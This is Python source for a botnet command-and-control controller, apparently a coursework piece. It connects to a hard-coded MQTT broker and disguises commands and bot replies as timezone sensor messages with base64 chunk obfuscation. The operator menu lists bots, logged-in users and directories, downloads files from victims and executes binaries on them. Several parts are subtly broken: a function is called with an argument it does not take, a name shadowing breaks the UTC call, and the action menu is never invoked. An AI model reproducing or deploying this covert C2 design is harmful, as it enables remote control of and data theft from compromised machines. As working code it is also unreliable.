from paho.mqtt import client as mqtt
from datetime import datetime
from zoneinfo import ZoneInfo
import threading
import base64
import json
import time
import random

response_lock = threading.Lock()
bot_responses = []

#################################### COMMON CODE STARTS HERE ###################################

MQTT_BROKER = "147.32.82.209"
MQTT_PORT = 1883
MQTT_TOPIC = "sensors"

char_to_timezone = {
    "A": "America/Anchorage",
    "B": "Europe/Berlin",
    "C": "America/Chicago",
    "D": "Asia/Dubai",
    "E": "Europe/Edinburgh",
    "F": "America/Fortaleza",
    "G": "Europe/Gibraltar",
    "H": "Pacific/Honolulu",
    "I": "Asia/Istanbul",
    "J": "Asia/Jakarta",
    "K": "Europe/Kiev",
    "L": "Europe/London",
    "M": "America/Mexico_City",
    "N": "America/New_York",
    "O": "Europe/Oslo",
    "P": "Europe/Prague",
    "Q": "America/Quebec",
    "R": "Europe/Rome",
    "S": "Asia/Shanghai",
    "T": "Asia/Tokyo",
    "U": "Asia/Ulaanbaatar",
    "V": "Europe/Vienna",
    "W": "Europe/Warsaw",
    "X": "America/Cancun",  # X is difficult - using location with X sound
    "Y": "America/Yakutat",
    "Z": "Europe/Zurich",
    ", ": "AFRICA/JOHANNESBURG",
}

timezone_to_char = {v.upper(): k for k, v in char_to_timezone.items()}

action_to_timezone = {
    0: "UTC",
    1: "America/New_York",
    2: "America/Los_Angeles",
    3: "America/Chicago",
    4: "Europe/London",
    5: "Europe/Paris",
    6: "Europe/Berlin",
    7: "Europe/Prague",
    8: "Asia/Tokyo",
    9: "Asia/Shanghai",
    10: "Australia/Sydney",
}

timezone_to_action = {v.upper(): k for k, v in action_to_timezone.items()}

def do_very_strange_encryption(text: str):
    encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
    
    # char_to_timezone values
    timezones = list(char_to_timezone.values())
    
    chunks = []
    i = 0
    while i < len(encoded):
        chunk_size = random.randint(7, 20)
        chunks.append(encoded[i:i+chunk_size])
        i += chunk_size
    
    # create JSON mapping timezones to chunks, cycling through timezones if needed
    result = {}
    for idx, chunk in enumerate(chunks):
        timezone = timezones[idx % len(timezones)]
        if timezone not in result:
            result[timezone] = []
        result[timezone].append(chunk)
    
    return json.dumps(result)

def do_very_strange_decryption(encrypted_json: str):
    data = json.loads(encrypted_json)
    
    # char_to_timezone values
    timezones = list(char_to_timezone.values())
    
    # Reconstruct chunks in correct order
    chunks = []
    timezone_idx = 0
    chunk_counts = {tz: 0 for tz in timezones}
    
    # Continue until all chunks are collected
    while True:
        current_tz = timezones[timezone_idx % len(timezones)]
        
        if current_tz in data and chunk_counts[current_tz] < len(data[current_tz]):
            chunks.append(data[current_tz][chunk_counts[current_tz]])
            chunk_counts[current_tz] += 1
            timezone_idx += 1
        else:
            # Check if we've collected all chunks
            all_collected = all(
                tz not in data or chunk_counts[tz] == len(data[tz])
                for tz in timezones
            )
            if all_collected:
                break
            timezone_idx += 1
            
        # Safety check to avoid infinite loop
        if timezone_idx > 10000:
            break
    
    # Concatenate chunks and decode
    encoded = ''.join(chunks)
    decoded = base64.b64decode(encoded).decode('utf-8')
    return decoded

################################### COMMON CODE ENDS HERE ###################################

def on_connect(client, userdata, flags, rc):
    # rc - connection result code. 0 - success, otherwise failure.
    if rc == 0:
        print("Connected to MQTT Broker.")
        print(f"Subscribing to topic: {MQTT_TOPIC}.")
        # subscribe to all subtopics to handle responses
        client.subscribe(f"{MQTT_TOPIC}/#")
    else:
        print(f"Failed to connect, connection return code {rc}.")
        client.disconnect()
        exit(1)

def on_message(client, userdata, msg):
    try:
        payload = msg.payload.decode()
        data = decode_response(payload)

        with response_lock:
            bot_responses.append(data)

    except Exception as ex:
        print(f"Failed to handle message: {ex}")

def decode_response(payload: str):
    try:
        data = json.loads(payload)
        result = {}
        message = ""
        bot_id = ""

        if "local_time" in data:
            # this field means bot id
            bot_id = data["local_time"]

        if "leap_seconds" in data:
            # if "leap_seconds" present, it contains encrypted message
            encrypted_msg = data["leap_seconds"]
            decrypted_msg = do_very_strange_decryption(encrypted_msg)
            message += f"{decrypted_msg}"

        elif "synced" in data:
            # if "synced" present, bot is alive
            message += f"Bot is alive at {datetime.now()}"

        elif "timezones" in data:
            # if "timezones" present, every timezone in list is mapped to character A-Z
            for tz in data["timezones"]:
                message += timezone_to_char[tz.upper()]

        result["bot_id"] = bot_id
        result["message"] = message
        return result
    except json.JSONDecodeError:
        raise Exception("Invalid JSON payload.")

def timezone_date_time(timezone: str):
    now_utc = datetime.now(timezone.utc)
    try:
        return now_utc.astimezone(ZoneInfo(timezone))
    except Exception:
        # ignore error, return anything
        return now_utc

def publish_action_call(client: mqtt.Client, action_number: int, path: str = None):
    if action_number not in action_to_timezone:
        print(f"Timezone is missing for action number {action_number}")
        raise Exception(f"Timezone is missing for action number {action_number}")

    timezone = action_to_timezone[action_number]
    if timezone is None:
        print(f"Please add more timezones to dictionary: {action_number}")
        return

    dt = timezone_date_time(timezone)
    
    msg = ""
    if path is not None:
        pathEncoded = do_very_strange_encryption(text=path, key=timezone)
        msg = f'{{"timezone": "{timezone}", "datetime": "{dt.isoformat()}", "leap_seconds": "{pathEncoded}"}}'
    else:
        msg = f'{{"timezone": "{timezone}", "datetime": "{dt.isoformat()}"}}'

    with response_lock:
        bot_responses.clear()

    client.publish(MQTT_TOPIC, msg)

def wait_for_responses(timeout=5):
    print(f"Waiting {timeout} seconds for bot responses...")
    time.sleep(timeout)
    with response_lock:
        print(f"\nBot responses ({len(bot_responses)}):")
        for response in bot_responses:
            print(f"\t- {response["bot_id"]}: {response["message"]}")

def user_actions(client: mqtt.Client):
    retry = True
    while retry:
        retry = False
        print("Actions:")
        print("\t[1] List alive bots.")
        print("\t[2] List logged in users.")
        print("\t[3] List content of specified directory.")
        print("\t[4] Print ID of user running the bot.")
        print("\t[5] Download specified file.")
        print("\t[6] Execute a binary.")

        action = input("Select action: ").strip()

        path = None
        if action in ["3", "5", "6"]:
            path = input("Enter path: ").strip()
            if not path:
                print("Path cannot be empty.")
                retry = True
                continue

        if action in ["1", "2", "3", "4", "5", "6"]:
            publish_action_call(client, int(action), path)
            wait_for_responses()
        else:
            print("Invalid action selected.")
            retry = True

def main():

    # create MQTT client
    client_id = f"Controller{random.randint(1, 10000)}"
    client = mqtt.Client(client_id)

    client.on_connect = on_connect
    client.on_message = on_message

    client.connect(MQTT_BROKER, MQTT_PORT)

    try:
        client.loop_forever()
    except KeyboardInterrupt:
        client.disconnect()
    except Exception as ex:
        print(f"An error occurred: {ex}")
        client.disconnect()

if __name__ == "__main__":
    main()
